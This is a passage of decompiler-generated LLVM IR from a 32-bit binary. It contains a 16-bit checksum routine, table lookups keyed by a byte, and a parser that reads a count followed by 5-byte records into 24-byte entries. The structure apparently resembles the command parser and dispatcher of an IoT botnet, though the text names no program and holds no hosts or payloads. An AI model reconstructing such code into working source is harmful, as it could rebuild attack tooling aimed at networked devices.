  %v1_4003a02 = phi i32 [ %v1_4003a0, %dec_label_pc_40039c ], [ %v2_40038c, %dec_label_pc_40036c ]
  %v3_4003a41 = phi i32 [ %v3_4003a4, %dec_label_pc_40039c ], [ %v1_400388, %dec_label_pc_40036c ]
  %v2_40039c = add i32 %v3_4003a41, %v1_4003a02
  %v1_4003a0 = udiv i32 %v2_40039c, 65536
  %tmp = icmp ult i32 %v2_40039c, 65536
  %v3_4003a4 = urem i32 %v2_40039c, 65536
  br i1 %tmp, label %dec_label_pc_4003a8, label %dec_label_pc_40039c

dec_label_pc_4003a8:                              ; preds = %dec_label_pc_40039c
  %v2_4003b0 = xor i32 %v3_4003a4, 65535
  ret i32 %v2_4003b0

; uselistorder directives
  uselistorder i32 %v3_4003a4, { 1, 0 }
  uselistorder i32 %v2_40039c, { 2, 0, 1 }
  uselistorder i32 %v1_400388, { 1, 0 }
  uselistorder i32 %v2_400348, { 1, 0, 2 }
  uselistorder label %dec_label_pc_40036c, { 1, 0 }
}

define i32 @function_4003b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4003b8:
  %v1_4003c4 = urem i32 %arg1, 256
  %v1_4003c8 = urem i32 %arg3, 256
  %v1_4003cc = add i32 %arg2, 4
  br label %dec_label_pc_4003dc

dec_label_pc_4003dc:                              ; preds = %dec_label_pc_4003f0, %dec_label_pc_4003b8
  %v0_4004005 = phi i32 [ %v0_400400, %dec_label_pc_4003f0 ], [ 0, %dec_label_pc_4003b8 ]
  %v0_4003f4 = phi i32 [ %v3_4003f8, %dec_label_pc_4003f0 ], [ 0, %dec_label_pc_4003b8 ]
  %v0_4003f0 = phi i32 [ %v1_4003f0, %dec_label_pc_4003f0 ], [ %v1_4003cc, %dec_label_pc_4003b8 ]
  %v1_4003dc = inttoptr i32 %v0_4003f0 to i8*
  %v2_4003dc = load i8, i8* %v1_4003dc, align 1
  %v3_4003dc = zext i8 %v2_4003dc to i32
  %v2_4003e4 = icmp eq i32 %v3_4003dc, %v1_4003c8
  br i1 %v2_4003e4, label %dec_label_pc_4003e8, label %dec_label_pc_4003f0

dec_label_pc_4003e8:                              ; preds = %dec_label_pc_4003dc
  %v1_4003ec = add i32 %v0_4003f0, -4
  %v2_4003ec = inttoptr i32 %v1_4003ec to i32*
  %v3_4003ec = load i32, i32* %v2_4003ec, align 4
  br label %dec_label_pc_4003f0

dec_label_pc_4003f0:                              ; preds = %dec_label_pc_4003dc, %dec_label_pc_4003e8
  %v0_400400 = phi i32 [ %v0_4004005, %dec_label_pc_4003dc ], [ %v3_4003ec, %dec_label_pc_4003e8 ]
  %v1_4003f0 = add i32 %v0_4003f0, 8
  %v2_4003f4 = icmp slt i32 %v0_4003f4, %v1_4003c4
  %v3_4003f8 = add nuw nsw i32 %v0_4003f4, 1
  br i1 %v2_4003f4, label %dec_label_pc_4003dc, label %dec_label_pc_4003fc

dec_label_pc_4003fc:                              ; preds = %dec_label_pc_4003f0
  %v1_400400 = icmp eq i32 %v0_400400, 0
  br i1 %v1_400400, label %dec_label_pc_400418, label %dec_label_pc_400404

dec_label_pc_400404:                              ; preds = %dec_label_pc_4003fc
  %v3_400410 = call i32 @function_4045b0(i64 10)
  br label %dec_label_pc_400418

dec_label_pc_400418:                              ; preds = %dec_label_pc_4003fc, %dec_label_pc_400404
  ret i32 %arg4

; uselistorder directives
  uselistorder i32 %v0_4003f4, { 1, 0 }
  uselistorder label %dec_label_pc_400418, { 1, 0 }
  uselistorder label %dec_label_pc_4003f0, { 1, 0 }
}

define i32 @function_400420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_400420:
  %s4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @a3, align 4
  store i32 %arg1, i32* %s4.global-to-local, align 4
  %v1_40045c = urem i32 %arg2, 256
  store i32 %v1_40045c, i32* @s1, align 4
  %v1_400460 = urem i32 %arg3, 256
  store i32 %v1_400460, i32* @s2, align 4
  %v4_400464 = zext i8 %arg5 to i32
  store i32 %v4_400464, i32* @s3, align 4
  store i32 -1, i32* @s0, align 4
  %v1_400468 = call i32 @unknown_0()
  %v1_400474 = load i32, i32* @s0, align 4
  %v2_400474 = icmp eq i32 %v1_400468, %v1_400474
  %v1_40047c = icmp sgt i32 %v1_400468, 0
  %or.cond = or i1 %v1_40047c, %v2_400474
  br i1 %or.cond, label %dec_label_pc_400560, label %dec_label_pc_400480

dec_label_pc_400480:                              ; preds = %dec_label_pc_400420
  %v3_400484 = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_400484, i32* @t9, align 4
  %v1_40048c = call i32 @function_404b70()
  store i32 %v1_40048c, i32* @v0, align 4
  %v1_400498 = load i32, i32* @s0, align 4
  %v2_400498 = icmp eq i32 %v1_40048c, %v1_400498
  br i1 %v2_400498, label %dec_label_pc_4004f0, label %dec_label_pc_40049c

dec_label_pc_40049c:                              ; preds = %dec_label_pc_400480
  %v1_4004a0 = icmp eq i32 %v1_40048c, 0
  br i1 %v1_4004a0, label %dec_label_pc_4004a4, label %dec_label_pc_40051c

dec_label_pc_4004a4:                              ; preds = %dec_label_pc_40049c
  %v3_4004a8 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_4004a8, i32* @t9, align 4
  %v1_4004b0 = load i32, i32* %s4.global-to-local, align 4
  %v3_4004b0 = call i32 @function_406580(i32 %v1_4004b0)
  %v3_4004c0 = load i32, i32* @global_var_449348.6, align 4
  store i32 %v3_4004c0, i32* @t9, align 4
  %v1_4004c8 = call i32 @function_404c30()
  %v3_4004d8 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_4004d8, i32* @t9, align 4
  %v3_4004e0 = call i32 @function_404c90(i32 %v1_4004c8, i32 9)
  store i32 %v3_4004e0, i32* @v0, align 4
  br label %dec_label_pc_4004f0

dec_label_pc_4004f0:                              ; preds = %dec_label_pc_400480, %dec_label_pc_4004a4
  %v3_4004f0 = load i32, i32* @global_var_4492dc.8, align 4
  store i32 %v3_4004f0, i32* @t9, align 4
  %v2_4004f8 = call i32 @function_406490(i32 0)
  br label %dec_label_pc_400500

dec_label_pc_400500:                              ; preds = %dec_label_pc_40053c, %dec_label_pc_4004f0
  %v0_400500 = phi i32 [ %v2_4004f8, %dec_label_pc_4004f0 ], [ %v0_400548, %dec_label_pc_40053c ]
  %v1_400500 = inttoptr i32 %v0_400500 to i32*
  %v2_400500 = load i32, i32* %v1_400500, align 4
  call void @__pseudo_call(i32 %v2_400500)
  br label %dec_label_pc_40051c

dec_label_pc_40051c:                              ; preds = %dec_label_pc_40049c, %dec_label_pc_400500
  %v3_400524 = load i32, i32* @global_var_449500.11, align 4
  %v0_40052c = load i32, i32* @s1, align 4
  %v1_40052c = urem i32 %v0_40052c, 256
  br label %dec_label_pc_400530

dec_label_pc_400530:                              ; preds = %dec_label_pc_400548, %dec_label_pc_40051c
  %v0_400548 = phi i32 [ %v3_400548, %dec_label_pc_400548 ], [ %v3_400524, %dec_label_pc_40051c ]
  %v1_400530 = add i32 %v0_400548, 4
  %v2_400530 = inttoptr i32 %v1_400530 to i8*
  %v3_400530 = load i8, i8* %v2_400530, align 1
  %v1_400538 = icmp eq i8 %v3_400530, 0
  br i1 %v1_400538, label %dec_label_pc_400548, label %dec_label_pc_40053c

dec_label_pc_40053c:                              ; preds = %dec_label_pc_400530
  %v4_400530 = zext i8 %v3_400530 to i32
  %v2_400540 = icmp eq i32 %v1_40052c, %v4_400530
  br i1 %v2_400540, label %dec_label_pc_400500, label %dec_label_pc_400548

dec_label_pc_400548:                              ; preds = %dec_label_pc_40053c, %dec_label_pc_400530
  %v1_400548 = add i32 %v0_400548, 8
  %v2_400548 = inttoptr i32 %v1_400548 to i32*
  %v3_400548 = load i32, i32* %v2_400548, align 4
  %v1_400550 = icmp eq i32 %v3_400548, 0
  br i1 %v1_400550, label %dec_label_pc_400560, label %dec_label_pc_400530

dec_label_pc_400560:                              ; preds = %dec_label_pc_400548, %dec_label_pc_400420
  %v4_40057c = phi i32 [ %v1_400468, %dec_label_pc_400420 ], [ 0, %dec_label_pc_400548 ]
  ret i32 %v4_40057c

; uselistorder directives
  uselistorder i32 %v3_400548, { 1, 0 }
  uselistorder i8 %v3_400530, { 1, 0 }
  uselistorder i32 %v0_400548, { 1, 2, 0 }
  uselistorder label %dec_label_pc_40051c, { 1, 0 }
  uselistorder label %dec_label_pc_4004f0, { 1, 0 }
}

define i32 @function_400584(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_400584:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_40058c = load i32, i32* @t9, align 4
  store i32 %tmp, i32* @s2, align 4
  %v1_4005b0 = icmp eq i32 %arg2, 0
  store i32 %arg3, i32* %s3.global-to-local, align 4
  br i1 %v1_4005b0, label %dec_label_pc_4005cc, label %dec_label_pc_4005b4

dec_label_pc_4005b4:                              ; preds = %dec_label_pc_400584
  %v3_4005b8 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_4005b8, i32* @t9, align 4
  %v3_4005c0 = call i32 @function_406080(i32 %arg2)
  %v0_4005cc.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_4005cc

dec_label_pc_4005cc:                              ; preds = %dec_label_pc_400584, %dec_label_pc_4005b4
  %v0_4005cc = phi i32 [ %tmp, %dec_label_pc_400584 ], [ %v0_4005cc.pre, %dec_label_pc_4005b4 ]
  store i32 %v0_4005cc, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_4005f8 = add i32 %v1_40058c, 298240
  %v2_4005f8 = inttoptr i32 %v1_4005f8 to i32*
  br label %dec_label_pc_4005d8

dec_label_pc_4005d8:                              ; preds = %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge, %dec_label_pc_4005cc
  %v0_4005f43 = phi i32 [ %v3_4005fc, %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge ], [ 0, %dec_label_pc_4005cc ]
  %v0_4005d8 = phi i32 [ %v0_4005d8.pre, %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge ], [ %v0_4005cc, %dec_label_pc_4005cc ]
  %v1_4005d8 = inttoptr i32 %v0_4005d8 to i32*
  %v2_4005d8 = load i32, i32* %v1_4005d8, align 4
  %v1_4005dc = add i32 %v0_4005d8, 8
  store i32 %v1_4005dc, i32* %s0.global-to-local, align 4
  %v1_4005e0 = icmp eq i32 %v2_4005d8, 0
  br i1 %v1_4005e0, label %dec_label_pc_4005f4, label %dec_label_pc_4005e4

dec_label_pc_4005e4:                              ; preds = %dec_label_pc_4005d8
  %v0_4005e8 = load i32, i32* @t9, align 4
  call void @__pseudo_call(i32 %v0_4005e8)
  %v0_4005f4.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4005f4

dec_label_pc_4005f4:                              ; preds = %dec_label_pc_4005d8, %dec_label_pc_4005e4
  %v2_4005fc = phi i32 [ %v0_4005f43, %dec_label_pc_4005d8 ], [ %v0_4005f4.pre, %dec_label_pc_4005e4 ]
  %v1_4005f4 = load i32, i32* %s3.global-to-local, align 4
  %v2_4005f4 = icmp slt i32 %v2_4005fc, %v1_4005f4
  %v3_4005f8 = load i32, i32* %v2_4005f8, align 4
  store i32 %v3_4005f8, i32* @t9, align 4
  %v1_4005fc = icmp eq i1 %v2_4005f4, false
  %v3_4005fc = add i32 %v2_4005fc, 1
  store i32 %v3_4005fc, i32* %s1.global-to-local, align 4
  br i1 %v1_4005fc, label %dec_label_pc_400600, label %dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge

dec_label_pc_4005f4.dec_label_pc_4005d8_crit_edge: ; preds = %dec_label_pc_4005f4
  %v0_4005d8.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4005d8

dec_label_pc_400600:                              ; preds = %dec_label_pc_4005f4
  %v3_4005f4 = zext i1 %v2_4005f4 to i32
  call void @__pseudo_branch(i32 %v3_4005f8)
  ret i32 %v3_4005f4

; uselistorder directives
  uselistorder i32 %v3_4005fc, { 1, 0 }
  uselistorder i1 %v2_4005f4, { 1, 0 }
  uselistorder i32 %v0_4005d8, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_4005f4, { 1, 0 }
  uselistorder label %dec_label_pc_4005cc, { 1, 0 }
}

define i32 @function_400624(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_400624:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %v0_400638 = load i32, i32* @fp, align 4
  %v0_40063c = load i32, i32* @s7, align 4
  %v0_400640 = load i32, i32* @s6, align 4
  %v0_400644 = load i32, i32* @s5, align 4
  %v0_400648 = load i32, i32* @s4, align 4
  %v0_40064c = load i32, i32* @s3, align 4
  %v0_400650 = load i32, i32* @s2, align 4
  %v0_400654 = load i32, i32* @s1, align 4
  %v0_400658 = load i32, i32* @s0, align 4
  %v1_400660 = icmp ult i32 %arg2, 4
  %v2_400660 = zext i1 %v1_400660 to i32
  store i32 %v2_400660, i32* %v0.global-to-local, align 4
  store i32 %arg2, i32* %s2.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  br i1 %v1_400660, label %dec_label_pc_4006b8, label %dec_label_pc_40066c

dec_label_pc_40066c:                              ; preds = %dec_label_pc_400624
  %v2_400670 = load i32, i32* %arg1, align 4
  store i32 %v2_400670, i32* %v1.global-to-local, align 4
  %v1_400674 = add i32 %arg2, -4
  store i32 %v1_400674, i32* %v0.global-to-local, align 4
  %v1_400678 = icmp eq i32 %v1_400674, 0
  br i1 %v1_400678, label %dec_label_pc_4006b8, label %dec_label_pc_40067c

dec_label_pc_40067c:                              ; preds = %dec_label_pc_40066c
  %v1_400680 = add i32 %tmp, 4
  %v2_400680 = inttoptr i32 %v1_400680 to i8*
  %v3_400680 = load i8, i8* %v2_400680, align 1
  %v4_400680 = sext i8 %v3_400680 to i32
  store i32 %v4_400680, i32* %a0.global-to-local, align 4
  %v1_400684 = add i32 %arg2, -5
  store i32 %v1_400684, i32* %v0.global-to-local, align 4
  %v1_400688 = icmp eq i32 %v1_400684, 0
  br i1 %v1_400688, label %dec_label_pc_4006b8, label %dec_label_pc_40068c

dec_label_pc_40068c:                              ; preds = %dec_label_pc_40067c
  %v1_400690 = add i32 %tmp, 5
  %v2_400690 = inttoptr i32 %v1_400690 to i8*
  %v3_400690 = load i8, i8* %v2_400690, align 1
  %v4_400690 = sext i8 %v3_400690 to i32
  store i32 %v4_400690, i32* %v1.global-to-local, align 4
  %v1_400698 = icmp eq i8 %v3_400690, 0
  %v3_400698 = urem i32 %v4_400690, 256
  store i32 %v3_400698, i32* @s7, align 4
  br i1 %v1_400698, label %dec_label_pc_4006b8, label %dec_label_pc_40069c

dec_label_pc_40069c:                              ; preds = %dec_label_pc_40068c
  %v2_4006a4 = mul nuw nsw i32 %v3_400698, 5
  store i32 %v2_4006a4, i32* %v1.global-to-local, align 4
  %v1_4006a8 = add i32 %arg2, -6
  %v2_4006ac = icmp ult i32 %v1_4006a8, %v2_4006a4
  %v3_4006ac = zext i1 %v2_4006ac to i32
  store i32 %v3_4006ac, i32* %v0.global-to-local, align 4
  %v1_4006b0 = icmp eq i1 %v2_4006ac, false
  br i1 %v1_4006b0, label %dec_label_pc_4006c0, label %dec_label_pc_4006b8

dec_label_pc_4006b8:                              ; preds = %dec_label_pc_40069c, %dec_label_pc_40068c, %dec_label_pc_40067c, %dec_label_pc_40066c, %dec_label_pc_400624
  %v0_4006c46 = phi i32 [ %v0_40063c, %dec_label_pc_400624 ], [ %v0_40063c, %dec_label_pc_40066c ], [ %v0_40063c, %dec_label_pc_40067c ], [ %v3_400698, %dec_label_pc_40068c ], [ %v3_400698, %dec_label_pc_40069c ]
  %.03 = phi i32 [ undef, %dec_label_pc_400624 ], [ %v2_400670, %dec_label_pc_40066c ], [ %v2_400670, %dec_label_pc_40067c ], [ %v2_400670, %dec_label_pc_40068c ], [ %v2_400670, %dec_label_pc_40069c ]
  %.02 = phi i32 [ undef, %dec_label_pc_400624 ], [ undef, %dec_label_pc_40066c ], [ %v4_400680, %dec_label_pc_40067c ], [ %v4_400680, %dec_label_pc_40068c ], [ %v4_400680, %dec_label_pc_40069c ]
  store i32 %v0_400658, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4006c0

dec_label_pc_4006c0:                              ; preds = %dec_label_pc_40069c, %dec_label_pc_4006b8
  %v0_4006c4 = phi i32 [ %v0_4006c46, %dec_label_pc_4006b8 ], [ %v3_400698, %dec_label_pc_40069c ]
  %.14 = phi i32 [ %.03, %dec_label_pc_4006b8 ], [ %v2_400670, %dec_label_pc_40069c ]
  %.1 = phi i32 [ %.02, %dec_label_pc_4006b8 ], [ %v4_400680, %dec_label_pc_40069c ]
  %v3_4006c0 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_4006c0, i32* %t9.global-to-local, align 4
  store i32 %v0_4006c4, i32* %a0.global-to-local, align 4
  store i32 24, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4006c0)
  %v0_4006d4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4006d4, i32* %s4.global-to-local, align 4
  %v0_4006d8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4006d8 = add i32 %v0_4006d8, 6
  store i32 %v1_4006d8, i32* %s0.global-to-local, align 4
  store i32 %v0_4006d4, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 2, i32* %t0.global-to-local, align 4
  %v2_4006f8.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_4006f0

dec_label_pc_4006f0:                              ; preds = %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge, %dec_label_pc_4006c0
  %v2_4006f8 = phi i32 [ %v4_40071c, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ %v2_4006f8.pre, %dec_label_pc_4006c0 ]
  %v0_4006f8.off0 = phi i16 [ %extract.t, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ 2, %dec_label_pc_4006c0 ]
  %v0_4006f0 = phi i32 [ %v0_4006f0.pre, %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge ], [ %v1_4006d8, %dec_label_pc_4006c0 ]
  %v1_4006f0 = add i32 %v0_4006f0, 4
  %v2_4006f0 = inttoptr i32 %v1_4006f0 to i8*
  %v3_4006f0 = load i8, i8* %v2_4006f0, align 1
  %v4_4006f0 = zext i8 %v3_4006f0 to i32
  store i32 %v4_4006f0, i32* %v1.global-to-local, align 4
  %v1_4006f4 = inttoptr i32 %v0_4006f0 to i32*
  %v2_4006f4 = load i32, i32* %v1_4006f4, align 4
  store i32 %v2_4006f4, i32* %v0.global-to-local, align 4
  %v3_4006f8 = add i32 %v2_4006f8, -24
  %v4_4006f8 = inttoptr i32 %v3_4006f8 to i16*
  store i16 %v0_4006f8.off0, i16* %v4_4006f8, align 2
  %v0_4006fc = load i32, i32* %s0.global-to-local, align 4
  %v1_4006fc = add i32 %v0_4006fc, 5
  store i32 %v1_4006fc, i32* %s0.global-to-local, align 4
  %v0_400700 = load i32, i32* %v0.global-to-local, align 4
  %v1_400700 = load i32, i32* %a1.global-to-local, align 4
  %v2_400700 = add i32 %v1_400700, -20
  %v3_400700 = inttoptr i32 %v2_400700 to i32*
  store i32 %v0_400700, i32* %v3_400700, align 4
  %v0_400704 = load i32, i32* %v1.global-to-local, align 4
  %v1_400704 = trunc i32 %v0_400704 to i8
  %v2_400704 = load i32, i32* %a0.global-to-local, align 4
  %v3_400704 = add i32 %v2_400704, -4
  %v4_400704 = inttoptr i32 %v3_400704 to i8*
  store i8 %v1_400704, i8* %v4_400704, align 1
  %v0_400708 = load i32, i32* %v0.global-to-local, align 4
  %v1_400708 = load i32, i32* %a0.global-to-local, align 4
  %v2_400708 = add i32 %v1_400708, -8
  %v3_400708 = inttoptr i32 %v2_400708 to i32*
  store i32 %v0_400708, i32* %v3_400708, align 4
  %v0_40070c = load i32, i32* %a3.global-to-local, align 4
  %v1_40070c = load i32, i32* @s7, align 4
  %v2_40070c = icmp slt i32 %v0_40070c, %v1_40070c
  %v3_40070c = zext i1 %v2_40070c to i32
  store i32 %v3_40070c, i32* %v0.global-to-local, align 4
  %v0_400710 = load i32, i32* %a2.global-to-local, align 4
  %v1_400710 = add i32 %v0_400710, 24
  store i32 %v1_400710, i32* %a2.global-to-local, align 4
  %v1_400714 = add i32 %v0_40070c, 1
  store i32 %v1_400714, i32* %a3.global-to-local, align 4
  %v0_400718 = load i32, i32* %a0.global-to-local, align 4
  %v1_400718 = add i32 %v0_400718, 24
  store i32 %v1_400718, i32* %a0.global-to-local, align 4
  %v1_40071c = icmp eq i1 %v2_40070c, false
  %v2_40071c = load i32, i32* %s4.global-to-local, align 4
  %v4_40071c = add i32 %v2_40071c, %v1_400710
  store i32 %v4_40071c, i32* %a1.global-to-local, align 4
  br i1 %v1_40071c, label %dec_label_pc_400720, label %dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge

dec_label_pc_4006f0.dec_label_pc_4006f0_crit_edge: ; preds = %dec_label_pc_4006f0
  %v0_4006f0.pre = load i32, i32* %s0.global-to-local, align 4
  %v0_4006f8.pre = load i32, i32* %t0.global-to-local, align 4
  %extract.t = trunc i32 %v0_4006f8.pre to i16
  br label %dec_label_pc_4006f0

dec_label_pc_400720:                              ; preds = %dec_label_pc_4006f0
  %v0_400724 = load i32, i32* %s2.global-to-local, align 4
  %v1_400724 = load i32, i32* %s1.global-to-local, align 4
  %v2_400724 = add i32 %v1_400724, %v0_400724
  %v1_400728 = load i32, i32* %s0.global-to-local, align 4
  %v2_400728 = sub i32 %v2_400724, %v1_400728
  store i32 %v2_400728, i32* %v0.global-to-local, align 4
  %v1_40072c = icmp eq i32 %v2_400728, 0
  store i32 %v1_400728, i32* %a0.global-to-local, align 4
  br i1 %v1_40072c, label %dec_label_pc_400730, label %dec_label_pc_400740

dec_label_pc_400730:                              ; preds = %dec_label_pc_400720
  store i32 %v2_40071c, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400740

dec_label_pc_400740:                              ; preds = %dec_label_pc_400720, %dec_label_pc_400730
  %v1_400740 = inttoptr i32 %v1_400728 to i8*
  %v2_400740 = load i8, i8* %v1_400740, align 1
  %v3_400740 = zext i8 %v2_400740 to i32
  store i32 %v3_400740, i32* %s6.global-to-local, align 4
  %v3_400744 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_400744, i32* %t9.global-to-local, align 4
  store i32 %v3_400740, i32* %a0.global-to-local, align 4
  store i32 8, i32* %a1.global-to-local, align 4
  %v2_400750 = add i32 %v2_400728, -1
  store i32 %v2_400750, i32* %s1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400744)
  %v0_40075c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_40075c, i32* %s5.global-to-local, align 4
  %v0_400760 = load i32, i32* %s0.global-to-local, align 4
  %v1_400760 = add i32 %v0_400760, 1
  store i32 %v1_400760, i32* %s2.global-to-local, align 4
  store i32 %v0_40075c, i32* %s3.global-to-local, align 4
  %v0_400770.pr = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400770

dec_label_pc_400770:                              ; preds = %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge, %dec_label_pc_400740
  %v0_400778 = phi i32 [ %v0_400830, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v1_400760, %dec_label_pc_400740 ]
  %v2_400770 = phi i32 [ %v2_400770.pre, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v0_40075c, %dec_label_pc_400740 ]
  %v0_400770 = phi i32 [ %v2_400810, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ %v0_400770.pr, %dec_label_pc_400740 ]
  %.01 = phi i32 [ %v1_400820, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ 0, %dec_label_pc_400740 ]
  %.0 = phi i32 [ %v1_400818, %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge ], [ undef, %dec_label_pc_400740 ]
  %v1_400770 = icmp eq i32 %v0_400770, 0
  store i32 %v2_400770, i32* %a0.global-to-local, align 4
  br i1 %v1_400770, label %dec_label_pc_4007a4, label %dec_label_pc_400774

dec_label_pc_400774:                              ; preds = %dec_label_pc_400770
  %v1_400778 = inttoptr i32 %v0_400778 to i8*
  %v2_400778 = load i8, i8* %v1_400778, align 1
  %v3_400778 = zext i8 %v2_400778 to i32
  store i32 %v3_400778, i32* %v0.global-to-local, align 4
  %v0_40077c = load i32, i32* %v1.global-to-local, align 4
  %v1_40077c = icmp eq i32 %v0_40077c, 0
  %v4_40077c = load i32, i32* %s3.global-to-local, align 4
  %v5_40077c = add i32 %v4_40077c, 4
  %v6_40077c = inttoptr i32 %v5_40077c to i8*
  store i8 %v2_400778, i8* %v6_40077c, align 1
  br i1 %v1_40077c, label %dec_label_pc_4007a4, label %dec_label_pc_400780

dec_label_pc_400780:                              ; preds = %dec_label_pc_400774
  %v0_400784 = load i32, i32* %s2.global-to-local, align 4
  %v1_400784 = add i32 %v0_400784, 1
  %v2_400784 = inttoptr i32 %v1_400784 to i8*
  %v3_400784 = load i8, i8* %v2_400784, align 1
  %v4_400784 = zext i8 %v3_400784 to i32
  store i32 %v4_400784, i32* %s0.global-to-local, align 4
  store i32 %.0, i32* %a2.global-to-local, align 4
  %v0_40078c = load i32, i32* %s3.global-to-local, align 4
  %v1_40078c = add i32 %v0_40078c, 8
  store i32 %v1_40078c, i32* %s3.global-to-local, align 4
  %v2_400790 = icmp slt i32 %.0, %v4_400784
  %v3_400790 = zext i1 %v2_400790 to i32
  store i32 %v3_400790, i32* %v0.global-to-local, align 4
  %v1_400794 = add nuw nsw i32 %v4_400784, 1
  store i32 %v1_400794, i32* %a0.global-to-local, align 4
  %v1_400798 = icmp eq i1 %v2_400790, false
  %v2_400798 = load i32, i32* @fp, align 4
  %v4_400798 = add i32 %v2_400798, %v4_400784
  store i32 %v4_400798, i32* %s2.global-to-local, align 4
  br i1 %v1_400798, label %dec_label_pc_4007e4, label %dec_label_pc_40079c

dec_label_pc_40079c:                              ; preds = %dec_label_pc_400780
  %v0_4007a0 = load i32, i32* %s5.global-to-local, align 4
  store i32 %v0_4007a0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4007a4

dec_label_pc_4007a4:                              ; preds = %dec_label_pc_400774, %dec_label_pc_400770, %dec_label_pc_40079c
  %v0_4007a4 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4007a4, i32* %a1.global-to-local, align 4
  %v0_4007a8 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_4007a8, i32* %a2.global-to-local, align 4
  %v3_4007ac = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  store i32 %v0_400638, i32* @fp, align 4
  store i32 %v0_40063c, i32* @s7, align 4
  store i32 %v0_400640, i32* %s6.global-to-local, align 4
  store i32 %v0_400644, i32* %s5.global-to-local, align 4
  store i32 %v0_400648, i32* %s4.global-to-local, align 4
  store i32 %v0_40064c, i32* %s3.global-to-local, align 4
  store i32 %v0_400650, i32* %s2.global-to-local, align 4
  store i32 %v0_400654, i32* %s1.global-to-local, align 4
  store i32 %v0_400658, i32* %s0.global-to-local, align 4
  %v1_4007d8 = add i32 %v3_4007ac, 1412
  store i32 %v1_4007d8, i32* %t9.global-to-local, align 4
  call void @__pseudo_branch(i32 %v1_4007d8)
  br label %dec_label_pc_4007e4

dec_label_pc_4007e4:                              ; preds = %dec_label_pc_400780, %dec_label_pc_4007a4
  %v0_4007e4 = load i32, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4007e4)
  %v0_4007f0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4007f0, i32* %a0.global-to-local, align 4
  %v3_4007f4 = load i32, i32* @global_var_44936c.20, align 4
  store i32 %v3_4007f4, i32* %t9.global-to-local, align 4
  %v1_4007f8 = load i32, i32* %s3.global-to-local, align 4
  %v2_4007f8 = add i32 %v1_4007f8, -8
  %v3_4007f8 = inttoptr i32 %v2_4007f8 to i32*
  store i32 %v0_4007f0, i32* %v3_4007f8, align 4
  %v0_4007fc = load i32, i32* @fp, align 4
  store i32 %v0_4007fc, i32* %a1.global-to-local, align 4
  %v1_400800 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v1_400800, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4007f4)
  %v2_400810 = sub i32 %.0, %v1_400800
  store i32 %v2_400810, i32* %s1.global-to-local, align 4
